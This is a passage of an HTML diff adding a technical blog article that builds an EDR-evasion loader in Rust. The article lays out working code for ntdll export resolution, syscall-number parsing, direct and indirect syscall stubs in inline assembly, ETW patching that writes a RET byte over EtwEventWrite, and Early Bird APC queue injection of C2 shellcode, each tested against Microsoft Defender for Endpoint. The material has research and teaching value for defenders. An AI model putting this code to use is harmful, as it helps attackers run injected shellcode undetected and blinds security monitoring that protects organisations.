+                ntdll_base_address.<span class="hljs-title function_ invoke__">add</span>(name_rva <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">i8</span>
+            );
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(name_str) = name_cstr.<span class="hljs-title function_ invoke__">to_str</span>() {
+                <span class="hljs-keyword">if</span> ntdll_function == name_str {
+                    <span class="hljs-keyword">let</span> <span class="hljs-variable">ordinal_index</span> = *ordinal.<span class="hljs-title function_ invoke__">add</span>(j <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);
+                    RVA = *address.<span class="hljs-title function_ invoke__">add</span>(ordinal_index <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;
+                    <span class="hljs-keyword">break</span>;
+                }
+            }
+        }
+        <span class="hljs-keyword">if</span> RVA != <span class="hljs-number">0</span> { ntdll_base_address.<span class="hljs-title function_ invoke__">add</span>(RVA <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) } <span class="hljs-keyword">else</span> { ptr::<span class="hljs-title function_ invoke__">null_mut</span>() }
+    }
+}</code></pre>
+          </div>
+        </div>
+        <p>Once the address of the targeted Nt function is resolved, syscalls can be made.</p>
+              <div class="note">
+          <strong>Remark:</strong>
+          <p>An in-depth explanation is done in this <a href="https://web.archive.org/web/20250624082010/https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/" target="_blank">article</a> where it explains relations in between the double-linked list and arrays indexing each other, in order to retrieve effectively the target Nt function's address.</p>
+        </div>
+      </section>
+
+      <!-- SECTION IV -->
+      <section id="s4">
+        <h2>IV. Indirect Syscalls, ETW Patching and Their Limitations</h2>
+        <p>Before getting deeper into technical parts, it is important to understand the first strategy used to test evasion techniques in this section, as the strategy evolved during the article. So first, the implementation of the solution was aiming at <strong>creating a thread in an already existing process using the NtCreateRemoteThread</strong> function, in order to inject the C2 shellcode in an already existing process's opened thread. <strong>However, as we will see at the end of this section, this strategy evolved.</strong></p>
+
+        <h3 id="s4a">A. Parsing the SSN</h3>
+        <p>The address of the wanted Nt function was obtained. The <strong>syscall number</strong> (SSN) needs to be <strong>parsed from a given Nt function</strong>, which is NtCreateRemoteThread in our case. An Nt function looks as follows in memory: </p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image23.png" alt="Nt function memory layout showing SSN between MOV and SYSCALL instructions" class="article-img">
+<p>Remember the syscall number has to be <strong>pushed into the EAX register</strong>. Hence, it is <code>0C5</code> here, as the letter <code>h</code> is for hexadecimal. Therefore, if we parse the hexadecimal that is in between <code>4C8BD1B8</code> (<strong>first MOV instruction and beginning of the second one</strong>) and <code>0FC5</code> (SYSCALL instruction), the <strong>SSN can be found</strong>:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>find_ssn() — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_ssn</span>(func_addr: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span> {
+    <span class="hljs-keyword">unsafe</span> {
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">mov_header</span> = [<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xB8</span>];
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">syscall</span> = [<span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>];
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">bytes</span> = std::slice::<span class="hljs-title function_ invoke__">from_raw_parts</span>(func_addr, <span class="hljs-number">32</span>);
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">syscall_numbre_can_be_found</span>: <span class="hljs-type">Option</span> = <span class="hljs-literal">None</span>;
+        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..bytes.<span class="hljs-title function_ invoke__">len</span>() {
+            <span class="hljs-keyword">if</span> i + mov_header.<span class="hljs-title function_ invoke__">len</span>() &lt;= bytes.<span class="hljs-title function_ invoke__">len</span>() &amp;&amp; bytes[i..i + mov_header.<span class="hljs-title function_ invoke__">len</span>()] == mov_header {
+                <span class="hljs-keyword">for</span> <span class="hljs-variable">j</span> <span class="hljs-keyword">in</span> i+mov_header.<span class="hljs-title function_ invoke__">len</span>()..bytes.<span class="hljs-title function_ invoke__">len</span>() {
+                    <span class="hljs-keyword">if</span> j+syscall.<span class="hljs-title function_ invoke__">len</span>() &lt;= bytes.<span class="hljs-title function_ invoke__">len</span>() &amp;&amp; bytes[j..j+syscall.<span class="hljs-title function_ invoke__">len</span>()] == syscall {
+                        syscall_numbre_can_be_found = <span class="hljs-title function_ invoke__">Some</span>(i+mov_header.<span class="hljs-title function_ invoke__">len</span>());
+                        <span class="hljs-keyword">break</span>;
+                    }
+                }
+            }
+        }
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">ssn_tmp</span>: <span class="hljs-type">Option</span> = <span class="hljs-literal">None</span>;
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(start_index_sys_number) = syscall_numbre_can_be_found {
+            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Syscall number start index: {:?} and syscall number is: {:X}{:X}"</span>,
+                start_index_sys_number,
+                bytes[start_index_sys_number+<span class="hljs-number">1</span>],
+                bytes[start_index_sys_number]);
+            ssn_tmp = <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-type">u16</span>::<span class="hljs-title function_ invoke__">from_le_bytes</span>([
+                bytes[start_index_sys_number],
+                bytes[start_index_sys_number+<span class="hljs-number">1</span>]
+            ]));
+        }
+        ssn_tmp
+    }
+}</code></pre>
+          </div>
+        </div>
+
+                <div class="note">
+          <strong>Remark:</strong>
+          <p>Rust is used to develop the solution, the best documentation is <strong>Microsoft crate's documentation</strong>, where the <strong>search bar</strong> can be used to find structs or functions: <a href="https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/type.LPTHREAD_START_ROUTINE.html" target="_blank">Microsoft's crate</a>. However, not all the structs or functions are always there, the most efficient way is <strong>to translate them from C</strong> using the <a href="https://github.com/x64dbg/x64dbg/blob/development/src/dbg/ntdll/ntdll.h" target="_blank">NTDLL declaration file</a> which is the <strong>absolute source of information</strong>.</p>
+        </div>
+        <h3 id="s4b">B. Direct Syscalls</h3>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>This section can be very <strong>low-level and technical</strong>. I strongly advise you to read this article in order to understand core concepts of low-level programming: <a href="https://eyilink.github.io/articles/buffer_overflow.html" target="_blank">Introduction to Stack-Based Buffer Overflow on x86 Architecture</a>.</p>
+        </div>
+        <p>In order to make a direct syscall, it is <strong>needed to build our own syscall stub</strong> in Assembly. To do so, Rust provides the <a href="https://doc.rust-lang.org/reference/inline-assembly.html" target="_blank">ASM</a> macro <strong>that permits writing Assembly</strong>. Moreover, the <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170#parameter-passing" target="_blank">Windows ABI</a> defines <strong>how arguments should be passed when calling a function</strong> in Assembly on Windows. The <strong>first four arguments should be passed respectively in the RCX, RDX, R8 and R9 registers</strong>, and if the function takes more than four arguments, the <strong>fifth and higher should be passed in the stack</strong>. To pass arguments in the stack, first a <strong>shadow space of 32 bytes is required</strong> and the allocated space in stack for our arguments <strong>should have an alignment of</strong> <a href="https://learn.microsoft.com/en-us/cpp/build/stack-usage?view=msvc-170" target="_blank">16 bytes</a>. The shadow space is 32 bytes because as said by the <strong>documentation</strong> "The caller must always allocate sufficient space to <strong>store four register parameters, even if the callee doesn't take that many parameters</strong>", therefore as RCX, RDX, R8 and R9 are 8 bytes each a shadow space of 4*8 bytes = 32 bytes should be empty at the beginning of the allocated space for arguments in the stack. Hence, in <strong>total the space needed</strong> in stack is <strong>32 bytes + number of arguments * 8 bytes</strong>, the <strong>result of this modulo 16 should be 0 as a 16 bytes alignment is required</strong>. Therefore, the two conditions are:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>Stack alignment formula</span>
+            <span class="lang-badge">Math</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-plaintext hljs" data-highlighted="yes">Total_size = 32 + number_of_args * 8
+Total_size % 16 === 0</code></pre>
+          </div>
+        </div>
+
+        <p>All the arguments are passed as <strong>pointers</strong> if they do not fit in a <strong>USIZE</strong>, which is 4 bytes in 32 architectures or 8 bytes in 64 architectures. The <strong>NtCreateRemoteThread</strong> function required in the solution takes <strong>11 arguments</strong>, therefore <strong>7 in the stack</strong>, so a <strong>space of 32 + 7*8 = 88 bytes</strong> would be needed. However, 88 modulo 16 is 8, therefore, to have an alignment of 16 bytes, we will <strong>need to allocate 96 bytes</strong> which is the highest and closest to 88 that is 0 modulo 16.</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>cup_IS() — Direct syscall — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">cup_IS</span>(arg0: <span class="hljs-type">usize</span>, arg1: <span class="hljs-type">usize</span>, arg2: <span class="hljs-type">u32</span>, arg3: <span class="hljs-type">u32</span>, args: <span class="hljs-type">Vec</span>, status: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">u32</span>){
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">nt_cup_addr</span> = <span class="hljs-title function_ invoke__">get_function_address</span>(<span class="hljs-string">"NtCreateRemoteThread"</span>);
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">ssn</span> = <span class="hljs-title function_ invoke__">find_ssn</span>(nt_cup_addr <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>).<span class="hljs-title function_ invoke__">unwrap</span>() <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">status_tmp</span>: <span class="hljs-type">u32</span> = *status;
+    <span class="hljs-keyword">unsafe</span> {
+        asm!(
+            <span class="hljs-string">"sub rsp, 96"</span>,
+            <span class="hljs-string">"mov [rsp + 32 +  0], {arg5}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 +  8], {arg6}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 16], {arg7}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 24], {arg8}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 32], {arg9}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 40], {arg10}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 48], {arg11}"</span>,
+            <span class="hljs-string">"mov qword ptr [rsp + 32 + 56], 0"</span>,
+            <span class="hljs-string">"mov r10, rcx"</span>,
+            <span class="hljs-string">"mov eax, {ssn:e}"</span>,
+            <span class="hljs-string">"syscall"</span>,
+            <span class="hljs-string">"add rsp, 96"</span>,
+            ssn = <span class="hljs-title function_ invoke__">in</span>(reg) ssn,
+            <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"rcx"</span>) arg0, <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"rdx"</span>) arg1,
+            <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"r8"</span>)  arg2, <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"r9"</span>) arg3,
+            arg5  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">0</span>], arg6  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">1</span>],
+            arg7  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">2</span>], arg8  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">3</span>],
+            arg9  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">4</span>], arg10 = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">5</span>],
+            arg11 = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">6</span>],
+            <span class="hljs-title function_ invoke__">lateout</span>(<span class="hljs-string">"rax"</span>) status_tmp,
+        );
+        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"NtCreateRemoteThread inDirect syscall status: {:X}"</span>, status_tmp);
+        *status = status_tmp;
+    }
+}</code></pre>
+          </div>
+        </div>
+
+        <p>It is <strong>required to zero the unused space</strong> in the stack, such as described by the line  "mov qword ptr [rsp + 32 + 56], 0", where the extra space used for alignment will not be used.</p>
+
+        <p>Making direct syscalls allows to evade user land detections from a function of the Windows API that could be hooked by EDRs. However, some EDRs still hook syscalls by changing the <strong>NTDLL's code and inserting a JMP instruction jumping to the EDR's code in order to analyze each syscall</strong>. In those cases, no syscall number (SSN) can be found:</p>
+         <img src="https://eyilink.github.io/articles/edr_article_images/image19.png" alt="Syscall instructions" class="article-img">
+
+        <p>Microsoft Defender for Endpoint (MDE) was used for testing and it <strong>does not hook syscalls</strong>, therefore the <strong>SSN could be retrieved</strong>. However, when it is not the case, other techniques can be used such as <strong>loading a clean copy of the NTDLL</strong> but this requires downloading it from a distant server which might trigger alerts or by using unconventional methods such as described in the IX. State of the art section. However, it is very unlikely that syscalls are hooked as kernel telemetry exists and that it requires some work.</p>
+
+        <p>Moreover, implementing only direct syscalls <strong>raises an issue</strong> during static analysis. If you <strong>decompile the binary and search for the syscall string</strong>, it will <strong>show the syscall instruction</strong> <strong>hardcoded</strong>, which is very <strong>suspicious</strong> from a blue team standpoint as legitimate programs should only use the high-level Windows API which is made for developer experience:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image31.png" alt="Syscall instruction visible in static analysis/decompiled binary" class="article-img">
+
+        <h3 id="s4c">C. Indirect Syscalls</h3>
+        <p>To remediate this, <strong>indirect syscalls</strong> which use <strong>trampolines</strong> to make the SYSCALL instruction were invented. This method consists in <strong>jumping to an already existing SYSCALL instruction</strong> in memory. As a result, the <strong>syscall string will not show up in the static analysis</strong>. In the implemented solution, the address of the SYSCALL instruction implemented in the wanted Nt function was used:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>cup_IS() — Indirect syscall — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">cup_IS</span>(arg0: <span class="hljs-type">usize</span>, arg1: <span class="hljs-type">usize</span>, arg2: <span class="hljs-type">u32</span>, arg3: <span class="hljs-type">u32</span>, args: <span class="hljs-type">Vec</span>, status: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">u32</span>){
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">nt_cup_addr</span> = <span class="hljs-title function_ invoke__">get_function_address</span>(<span class="hljs-string">"NtCreateRemoteThread"</span>);
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">sys_stub</span> = <span class="hljs-title function_ invoke__">trampoline_gap</span>(nt_cup_addr <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>).<span class="hljs-title function_ invoke__">unwrap</span>();
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">ssn</span> = <span class="hljs-title function_ invoke__">find_ssn</span>(nt_cup_addr <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>).<span class="hljs-title function_ invoke__">unwrap</span>() <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">status_tmp</span>: <span class="hljs-type">u32</span> = *status;
+    <span class="hljs-keyword">unsafe</span> {
+        asm!(
+            <span class="hljs-string">"sub rsp, 96"</span>,
+            <span class="hljs-string">"mov [rsp + 32 +  0], {arg5}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 +  8], {arg6}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 16], {arg7}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 24], {arg8}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 32], {arg9}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 40], {arg10}"</span>,
+            <span class="hljs-string">"mov [rsp + 32 + 48], {arg11}"</span>,
+            <span class="hljs-string">"mov qword ptr [rsp + 32 + 56], 0"</span>,
+            <span class="hljs-string">"mov r10, rcx"</span>,
+            <span class="hljs-string">"mov eax, {ssn:e}"</span>,
+            <span class="hljs-string">"call {jmp_sys}"</span>,
+            <span class="hljs-string">"add rsp, 96"</span>,
+            ssn = <span class="hljs-title function_ invoke__">in</span>(reg) ssn,
+            <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"rcx"</span>) arg0, <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"rdx"</span>) arg1,
+            <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"r8"</span>)  arg2, <span class="hljs-title function_ invoke__">in</span>(<span class="hljs-string">"r9"</span>) arg3,
+            arg5  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">0</span>], arg6  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">1</span>],
+            arg7  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">2</span>], arg8  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">3</span>],
+            arg9  = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">4</span>], arg10 = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">5</span>],
+            arg11 = <span class="hljs-title function_ invoke__">in</span>(reg) args[<span class="hljs-number">6</span>],
+            jmp_sys = <span class="hljs-title function_ invoke__">in</span>(reg) sys_stub,
+            <span class="hljs-title function_ invoke__">lateout</span>(<span class="hljs-string">"rax"</span>) status_tmp,
+        );
+        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"NtCreateRemoteThread inDirect syscall status: {:X}"</span>, status_tmp);
+        *status = status_tmp;
+    }
+}</code></pre>
+          </div>
+        </div>
+        <p>As a result, the indirect syscalls is still valid and during the static analysis the <strong>syscall string does not show anymore:</strong></p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image34.png" alt="After indirect syscalls: syscall string no longer visible in static analysis" class="article-img">
+        <p>Nonetheless, implementing <strong>only indirect syscalls was still detected by MDE as other mechanisms such as ETW or kernel telemetry exist</strong>.</p>
+
+        <div class="note">
+          <strong>Why using the CALL instruction instead of a JMP instruction in the syscall's ASM code?</strong>
+          <p>During testing, when the JMP instruction was used the program was crashing. It is because the <strong>CALL instruction restores the stack and the JMP does not restore the stack</strong>.</p>
+          <img src="https://eyilink.github.io/articles/edr_article_images/image33.png" alt="CALL vs JMP: CALL pushes return address, JMP does not" class="article-img">
+          <p>Indeed, a <strong>CALL instruction pushes first the return address</strong> in the stack in order to restore the stack pointer to where it was, because, <strong>since a syscall stub finishes by a RET instruction</strong>. The <strong>RET instruction tries to find the return address in the stack</strong> but does not find it when only the JMP instruction is used.</p>
+          <div class="note">
+            <strong>Remark:</strong>
+            <p>As the CALL instruction pushes the return address on the stack which means an 8 byte value. The <strong>zeroed space used for 16 alignment is used to keep this address</strong> in memory here (in between the 88 and 96 space that was previously hosting nothing, only zeros).</p>
+          </div>
+        </div>
+
+        <h3 id="s4d">D. ETW Patching</h3>
+        <p>ETW is a <strong>telemetry mechanism</strong> on Windows used with the <strong>publish/subscribe pattern</strong> which operates in <strong>user mode</strong>. Hence, ETW functions especially <strong>EtwEventWrite</strong> can be hooked <strong>to override the function's code with the RET instruction</strong> which will <strong>silence any event from ETW</strong>, which translates to changing the memory protection of <strong>EtwEventWrite</strong> to writable and insert the RET (0xC3) instruction at the beginning:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>etw_patching() — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">etw_patching</span>(patched_function: &amp;<span class="hljs-type">str</span>) {
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">etw_event_write_addr</span> = <span class="hljs-title function_ invoke__">get_function_address</span>(patched_function);
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">old_protect</span>: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS::<span class="hljs-title function_ invoke__">default</span>();
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">new_protect</span>: PAGE_PROTECTION_FLAGS = <span class="hljs-title function_ invoke__">PAGE_PROTECTION_FLAGS</span>(PAGE_EXECUTE_READWRITE.<span class="hljs-number">0</span>);
+    <span class="hljs-keyword">unsafe</span> {
+        <span class="hljs-title function_ invoke__">VirtualProtect</span>(etw_event_write_addr, <span class="hljs-number">1</span>, new_protect, &amp;<span class="hljs-keyword">mut</span> old_protect);
+        *(etw_event_write_addr <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>) = <span class="hljs-number">0xC3</span>;
+        <span class="hljs-title function_ invoke__">VirtualProtect</span>(etw_event_write_addr, <span class="hljs-number">1</span>, old_protect, &amp;<span class="hljs-keyword">mut</span> old_protect);
+    }
+}</code></pre>
+          </div>
+        </div>
+
+        <p>At this point, MDE still detected the <strong>thread creation</strong> because of <strong>kernel callbacks</strong> triggered by the <strong>NtCreateRemoteThread</strong> function:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image32.png" alt="MDE MITRE tags: DLL Injection, PE Injection, Process Hollowing - no alerts triggered" class="article-img">
+        <p>Tags shown on the picture are <strong>MITRE labels</strong> which means that <strong>MDE classified the action as those labels</strong> (mostly DLL injection), however, <strong>no alerts were triggered</strong>. Nonetheless, the <strong>strategy needed to evolve to make as least noise as possible</strong>, the next section will explain in detail why this evolution is needed.</p>
+      </section>
+
+      <!-- SECTION V -->
+      <section id="s5">
+        <h2>V. Evading Detection from Kernel Callbacks</h2>
+        <p>After defeating ETW and user land hooks via indirect syscalls, the called NtCreateRemoteThread function is still logged by MDE and triggering the "Dynamic-link Library Injection", "Portable Executable Injection" and "Process Hollowing" MITRE tags. This is because of <strong>kernel telemetry</strong> and especially <strong>kernel callbacks</strong>. It is because kernel callbacks take into account <strong>thread creation</strong>, <strong>thread creation triggers the PsSetCreateThreadNotifyRoutine</strong> that EDRs subscribe to and that <strong>generate a notification in kernel mode</strong> on thread creation. Hence, NtCreateRemoteThread will always generate a kernel callback. However, two solutions are conceivable:</p>
+        <ul>
+          <li><strong>Bring Your Own Vulnerable Driver</strong> (<a href="https://www.loldrivers.io/" target="_blank">BYOVD</a>): This consists in <strong>finding a vulnerable driver</strong> and taking advantage of it to disable the EDR or patch some functions to prevent kernel callbacks. Taking into account modern Windows kernel protections (Patch guard, HVCI, KCI, CFG), finding a vulnerable driver allowing writing primitives is <strong>not trivial</strong>.</li>
+          <li>The second solution is to <strong>use functions from the native API that do not trigger kernel callbacks</strong> such as using a method called <strong>ApcQueueInjection</strong>.</li>
+        </ul>
+        <p>The chosen method will be using stealthier function and <a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection" target="_blank">ApcQueue injection</a>. The goal of choosing this, is to trigger the <strong>least alerts</strong> and to <strong>generate the least telemetry possible</strong> towards the EDR. This method takes advantage of two mechanisms: <strong>Asynchronous Procedure Call</strong> (APC) and a <strong>thread in alertable state</strong>. APC is a function that <strong>executes asynchronously in the context of a specific thread</strong>. Windows provides the <strong>NtQueue</strong>ApcThread function, which <strong>allows an APC routine to be added to a thread's APC queue</strong>. The function <strong>will execute when the thread enters an alertable state</strong>. A thread can be put in an alertable state using the NtTestAlert function, which <strong>will then execute the payload queued by APC</strong>.</p>
+        <p>A twist of this method which is called <a href="https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection" target="_blank">Early Bird APC Queue injection</a>, exists and it is this method that is actually used in the developed solution. It consists in having two mechanisms: <strong>APC</strong> and a <strong>thread in a suspended state</strong>. The first part of this method is the same as the previous one, <strong>APC will queue a payload in a thread</strong>, however, the solution will create a <strong>process with a suspended thread</strong> meaning the <strong>execution of the process is suspended</strong>. Then <strong>APC will queue the payload in the thread's queue</strong>. Finally, the <strong>NtResumeThread</strong> function will <strong>be used to resume the thread's execution</strong> and <strong>execute the payload</strong>. This method presents an advantage to the classic APC Queue injection, which is that the <strong>malicious behavior takes place early on in the process initialization phase, increasing the likelihood of going under the radar of some EDR hooks</strong>.</p>
+      </section>
+
+      <!-- SECTION VI -->
+      <section id="s6">
+        <h2>VI. Toward Stealthier Implementation</h2>
+
+        <p>This part will describe the implementation of the Early Bird APC Queue injection in order to delete the "Dynamic-link Library Injection", "Portable Executable Injection" and "Process Hollowing" MITRE tags. Moreover, <strong>parent PID spoofing</strong> will be demonstrated to hide the identity of the creator of the new process needed in <strong>Early Bird APC</strong> <strong>Queue</strong> injection. Eventually, the last part will show how to enable protection on the newly created process so as to <strong>prevent the EDR injecting DLLs in our process</strong> by restricting allowed DLLs to only the ones signed by Microsoft.</p>
+
+        <h3 id="s6a">A. Early Bird APC Queue Injection</h3>
+        <p>This injection will be carried out in 5 steps:</p>
+        <ol>
+          <li><strong>Creating a new process with a thread in a suspended state</strong> using the NtCreateUserProcess function.</li>
+          <li><strong>Allocating virtual memory in the process</strong> for the payload using NtAllocateVirtualMemory.</li>
+          <li><strong>Writing the payload in the form of a shellcode</strong> in the previously allocated space using NtWriteVirtualMemory.</li>
+          <li><strong>Queuing the payload in the thread using APC</strong> and NtQueueAPCThread function.</li>
+          <li><strong>Resume the thread's execution in order to execute the payload</strong> (shellcode) using the NtResumeThread function.</li>
+        </ol>
+        <p>First, the functions NtAllocateVirtualMemory, NtWriteVirtualMemory, NtResumeThread, NtQueueAPCThread and NtCreateUserProcess needed to be defined with <strong>only NtCreateUserProcess implementing a direct syscall as it is the most sensitive function</strong>. To define an Nt function in Rust the following pattern can be used:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>nt_queue_apc_thread() — Rust</span>
+            <span class="lang-badge">Rust</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-rust hljs" data-highlighted="yes"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">NTQUEUEAPC_T</span> = <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"system"</span> <span class="hljs-title function_ invoke__">fn</span> (
+    HANDLE,
+    windows::Win32::System::IO::PIO_APC_ROUTINE,
+    *<span class="hljs-keyword">mut</span> core::ffi::c_void,
+    *<span class="hljs-keyword">mut</span> core::ffi::c_void,
+    *<span class="hljs-keyword">mut</span> core::ffi::c_void
+) <span class="hljs-punctuation">-&gt;</span> NTSTATUS;
+
+<span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">nt_queue_apc_thread</span>(
+    thread_handle: HANDLE,
+    shellcode_base_adress: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>,
+) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span> {
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">apc_routine</span>: windows::Win32::System::IO::PIO_APC_ROUTINE = <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-keyword">unsafe</span> {
+        std::mem::transmute::&lt;*<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>, <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"system"</span> <span class="hljs-title function_ invoke__">fn</span>(
+            *<span class="hljs-keyword">mut</span> core::ffi::c_void,
+            *<span class="hljs-keyword">mut</span> windows::Win32::System::IO::IO_STATUS_BLOCK,
+            <span class="hljs-type">u32</span>
+        )&gt;(shellcode_base_adress <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>)
+    });
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">proc</span> = <span class="hljs-title function_ invoke__">get_function_address</span>(<span class="hljs-string">"NtQueueApcThread"</span>);
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">s_NtQueueApcThread_t</span>: definitions::NTQUEUEAPC_T = <span class="hljs-keyword">unsafe</span> { std::mem::<span class="hljs-title function_ invoke__">transmute</span>(proc) };
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">status</span>: NTSTATUS = <span class="hljs-keyword">unsafe</span> {
+        <span class="hljs-title function_ invoke__">s_NtQueueApcThread_t</span>(thread_handle, apc_routine, ptr::<span class="hljs-title function_ invoke__">null_mut</span>(), ptr::<span class="hljs-title function_ invoke__">null_mut</span>(), ptr::<span class="hljs-title function_ invoke__">null_mut</span>())
+    };
+    <span class="hljs-title function_ invoke__">Some</span>(status)
+}</code></pre>
+          </div>
